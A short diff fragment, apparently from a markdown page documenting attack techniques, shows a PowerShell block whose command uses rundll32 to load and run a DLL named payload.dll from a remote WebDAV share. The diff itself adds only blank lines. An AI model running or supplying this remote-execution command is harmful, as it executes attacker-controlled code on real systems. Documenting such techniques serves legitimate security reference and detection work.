@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:09.604784+00:00'
 ```powershell
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
+
+
